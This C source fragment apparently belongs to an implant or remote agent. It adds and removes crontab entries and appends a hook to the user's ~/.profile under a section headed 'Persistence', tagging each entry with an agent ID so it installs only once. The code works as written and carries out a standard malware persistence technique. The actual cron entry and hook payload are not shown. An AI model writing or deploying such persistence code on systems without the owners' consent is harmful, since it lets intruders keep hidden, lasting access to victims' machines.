static int crontab_read(char *buf, size_t buf_sz, size_t *len_out) {
    FILE *rd = popen("crontab -l 2>/dev/null", "r");
    if (!rd) {
        *len_out = 0;
        return 0;
    }
    *len_out = fread(buf, 1, buf_sz - 1, rd);
    pclose(rd);
    buf[*len_out] = '\0';
    return 0;
}

static int crontab_write(const char *content, size_t len) {
    FILE *wr = popen("crontab -", "w");
    if (!wr) return -1;
    fwrite(content, 1, len, wr);
    pclose(wr);
    return 0;
}

static int crontab_contains_marker(const char *buf, size_t len) {
    return (len > 0 && strstr(buf, G.agent_id) != NULL);
}

static int crontab_add_entry(void) {
    char existing[8192] = {0};
    size_t elen = 0;

    crontab_read(existing, sizeof(existing), &elen);
    if (crontab_contains_marker(existing, elen)) return 0;

    char newbuf[sizeof(existing) + MAX_CRON_ENTRY + 64];
    int n = snprintf(newbuf, sizeof(newbuf), "%s\n# %s\n%s\n",
                     existing, G.agent_id, G.cron_entry);
    if (n < 0) return -1;
    size_t written = ((size_t)n < sizeof(newbuf)) ? (size_t)n : sizeof(newbuf) - 1;
    return crontab_write(newbuf, written);
}

static int crontab_remove_entry(void) {
    char existing[8192] = {0};
    size_t elen = 0;

    crontab_read(existing, sizeof(existing), &elen);
    if (elen == 0) return 0;

    char filtered[sizeof(existing)] = {0};
    size_t filt_off = 0;
    char *line = strtok(existing, "\n");

    while (line) {
        if (!strstr(line, G.agent_id)) {
            int w = snprintf(filtered + filt_off,
                             sizeof(filtered) - filt_off, "%s\n", line);
            if (w > 0) filt_off += (size_t)w;
        }
        line = strtok(NULL, "\n");
    }

    return crontab_write(filtered, filt_off);
}

/* ═══════════════════════════════════════════════════════════════════════════
 * Persistence — Profile Hook
 * ═══════════════════════════════════════════════════════════════════════════ */

static int profile_add_entry(const char *home) {
    char path[MAX_PATH + 32];
    snprintf(path, sizeof(path), "%s/.profile", home);

    FILE *pf = fopen(path, "r");
    if (pf) {
        char line[MAX_CMDLINE];
        while (fgets(line, sizeof(line), pf)) {
            if (strstr(line, G.agent_id)) {
                fclose(pf);
                return 0;
            }
        }
        fclose(pf);
    }

    FILE *af = fopen(path, "a");
    if (!af) return -1;
    fprintf(af, "\n# %s\n%s\n", G.agent_id, G.profile_hook);
    fclose(af);
    return 0;
}

